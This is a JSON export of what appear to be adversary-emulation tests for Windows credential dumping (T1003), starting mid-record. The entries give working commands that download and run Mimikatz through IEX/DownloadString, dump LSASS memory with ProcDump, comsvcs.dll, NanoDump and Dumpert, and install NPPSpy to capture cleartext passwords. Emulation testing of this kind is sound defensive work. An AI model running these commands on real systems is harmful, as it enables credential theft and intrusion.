screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privleges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | remote_script | URL to a remote Mimikatz script that dumps credentials | Url | https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1 | "}, "executionSteps": [{"description": "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t", "clacwm21200ic29mq7b3i3cxx"], "tags": []}, {"data": {"name": "Offline Credential Theft With Mimikatz", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | input_file | Path of the Lsass dump | Path | %tmp%\\lsass.DMP | \n | mimikatz_exe | Path of the Mimikatz binary | String | PathToAtomicsFolder\\T1003.001\\bin\\mimikatz.exe | "}, "executionSteps": [{"description": "#{mimikatz_exe} \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t", "clacwm21200ic29mq7b3i3cxx"], "tags": []}, {"data": {"name": "LSASS read with pypykatz", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple useranames and passwords/hashes to the screen.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "pypykatz live lsa\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t", "clacwm21200ic29mq7b3i3cxx"], "tags": []}, {"data": {"name": "Dump LSASS.exe using imported Microsoft DLLs", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | xordump_exe | Path to xordump | Path | C:\\Windows\\Temp\\xordump.exe | \n | output_file | Path where resulting dump should be placed | Path | C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp | "}, "executionSteps": [{"description": "#{xordump_exe} -out #{output_file} -x 0x41\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t"], "tags": []}, {"data": {"name": "Dump LSASS.exe Memory using Windows Task Manager", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task\nManager and administrative permissions.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "1. Open Task Manager:\n  On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking\n  on the task bar and selecting \"Task Manager\".\n\n2. Select lsass.exe:\n  If lsass.exe is not visible, select \"Show processes from all users\". This will allow you to observe execution of lsass.exe\n  and select it for manipulation.\n\n3. Dump lsass.exe memory:\n  Right-click on lsass.exe in Task Manager. Select \"Create Dump File\". The following dialog will show you the path to the saved file.\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t", "clacwm21200ic29mq7b3i3cxx"], "tags": []}, {"data": {"name": "Dump LSASS.exe Memory using ProcDump", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump.\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where resulting dump should be placed | Path | C:\\Windows\\Temp\\lsass_dump.dmp | \n | procdump_exe | Path of Procdump executable | Path | PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe | "}, "executionSteps": [{"description": "#{procdump_exe} -accepteula -ma lsass.exe #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t", "clacwm21200ic29mq7b3i3cxx"], "tags": []}, {"data": {"name": "Dump LSASS.exe Memory using Out-Minidump.ps1", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:SYSTEMROOT\\System32\\lsass_*.dmp.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Out-Minidump.ps1'); get-process lsass | Out-Minidump\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t", "clacwm21200ic29mq7b3i3cxx"], "tags": []}, {"data": {"name": "Dump LSASS.exe Memory using NanoDump", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "%temp%\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t"], "tags": []}, {"data": {"name": "Dump LSASS.exe Memory using direct system calls and API unhooking", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | dumpert_exe | Path of Dumpert executable | Path | PathToAtomicsFolder\\T1003.001\\bin\\Outflank-Dumpert.exe | "}, "executionSteps": [{"description": "#{dumpert_exe}\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t", "clacwm21200ic29mq7b3i3cxx"], "tags": []}, {"data": {"name": "Dump LSASS.exe Memory using comsvcs.dll", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with a built-in dll.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-comsvcs.dmp.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "C:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump (Get-Process lsass).id $env:TEMP\\lsass-comsvcs.dmp full\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t", "clacwm21200ic29mq7b3i3cxx"], "tags": []}, {"data": {"name": "Dump LSASS with .Net 5 createdump.exe", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "This test uses the technique describe in this tweet \n(https://twitter.com/bopin2020/status/1366400799199272960?s=20) from @bopin2020 in order to dump lsass\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where resulting dump should be placed | Path | C:\\Windows\\Temp\\dotnet-lsass.dmp | \n | createdump_exe | Path of createdump.exe executable | Path | C:\\Program Files\\dotnet\\shared\\Microsoft.NETCore.App\\5.*.*\\createdump.exe | "}, "executionSteps": [{"description": "echo \"Createdump Path #{createdump_exe}\"\n$LSASS = tasklist | findstr \"lsass\"\n$FIELDS = $LSASS -split \"\\s+\"\n$ID = $FIELDS[1]\n& \"#{createdump_exe}\" -u -f #{output_file} $ID\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t", "clacwm21200ic29mq7b3i3cxx"], "tags": []}, {"data": {"name": "Create Mini Dump of LSASS.exe using ProcDump", "shortName": "T1003.001", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | output_file | Path where resulting dump should be placed | Path | C:\\Windows\\Temp\\lsass_dump.dmp | \n | procdump_exe | Path of Procdump executable | Path | PathToAtomicsFolder\\T1003.001\\bin\\procdump.exe | "}, "executionSteps": [{"description": "#{procdump_exe} -accepteula -mm lsass.exe #{output_file}\n", "successCriteria": null}], "techniqueIds": ["clacwm67a035x29mq5edc2h0t", "clacwm21200ic29mq7b3i3cxx"], "tags": []}, {"data": {"name": "Gsecdump", "shortName": "T1003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Dump credentials from memory using Gsecdump.\n\nUpon successful execution, you should see domain\\username's followed by two 32 character hashes.\n\nIf you see output that says \"compat: error: failed to create child process\", execution was likely blocked by Anti-Virus. \nYou will receive only error output if you do not run this test from an elevated context (run as administrator)\n\nIf you see a message saying \"The system cannot find the path specified\", try using the get-prereq_commands to download and install Gsecdump first.\n\n\n**Supported Platforms:** windows\n\n**Inputs:**\n\n | Name | Description | Type | Default Value | \n | ---- | ----------- | ---- | ------------- | \n | gsecdump_exe | Path to the Gsecdump executable | Path | PathToAtomicsFolder\\T1003\\bin\\gsecdump.exe | \n | gsecdump_bin_hash | File hash of the Gsecdump binary file | String | 94CAE63DCBABB71C5DD43F55FD09CAEFFDCD7628A02A112FB3CBA36698EF72BC | \n | gsecdump_url | Path to download Gsecdump binary file | Url | https://web.archive.org/web/20150606043951if_/http://www.truesec.se/Upload/Sakerhet/Tools/gsecdump-v2b5.exe | "}, "executionSteps": [{"description": "#{gsecdump_exe} -a\n", "successCriteria": null}], "techniqueIds": ["clacwm5q602or29mqblra1604", "clacwm26g00m629mqalkhbknd"], "tags": []}, {"data": {"name": "Dump svchost.exe to gather RDP credentials", "shortName": "T1003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "The svchost.exe contains the RDP plain-text credentials.\nSource: https://www.n00py.io/2021/05/dumping-plaintext-rdp-credentials-from-svchost-exe/\n\nUpon successful execution, you should see the following file created $env:TEMP\\svchost-exe.dmp.\n\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "$ps = (Get-NetTCPConnection -LocalPort 3389 -State Established -ErrorAction Ignore)\nif($ps){$id = $ps[0].OwningProcess} else {$id = (Get-Process svchost)[0].Id }\nC:\\Windows\\System32\\rundll32.exe C:\\windows\\System32\\comsvcs.dll, MiniDump $id $env:TEMP\\svchost-exe.dmp full\n", "successCriteria": null}], "techniqueIds": ["clacwm5q602or29mqblra1604"], "tags": []}, {"data": {"name": "Credential Dumping with NPPSpy", "shortName": "T1003", "repositoryId": "clacwm17b000029mqcwg1etc9", "description": "Changes ProviderOrder Registry Key Parameter and creates Key for NPPSpy.\nAfter user's logging in cleartext password is saved in C:\\NPPSpy.txt.\nClean up deletes the files and reverses Registry changes.\nNPPSpy Source: https://github.com/gtworek/PSBits/tree/master/PasswordStealing/NPPSpy\n\n**Supported Platforms:** windows\n\n"}, "executionSteps": [{"description": "Copy-Item \"$env:Temp\\NPPSPY.dll\" -Destination \"C:\\Windows\\System32\"\n$path = Get-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\NetworkProvider\\Order\" -Name PROVIDERORDER\n$UpdatedValue = $Path.PROVIDERORDER + \",NPPSpy\"\nSet-ItemProperty -Path $Path.PSPath -Name \"PROVIDERORDER\" -Value $UpdatedValue\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy -ErrorAction Ignore\n$rv = New-Item -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Class\" -Value 2 -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"Name\" -Value NPPSpy -ErrorAction Ignore\n$rv = New-ItemProperty -Path HKLM:\\SYSTEM\\CurrentControlSet\\Services\\NPPSpy\\NetworkProvider -Name \"ProviderPath\" -PropertyType ExpandString -Value \"%SystemRoot%\\System32\\NPPSPY.dll\" -ErrorAction Ignore\necho \"[!] Please, logout and log back in. Cleartext password for this account is going to be located in C:\\NPPSpy.txt\"", "successCriteria": null}], "techniqueIds": ["clacwm5q602or29mqblra1604", "clacwm26g00m629mqalkhbknd"], "tags": []}]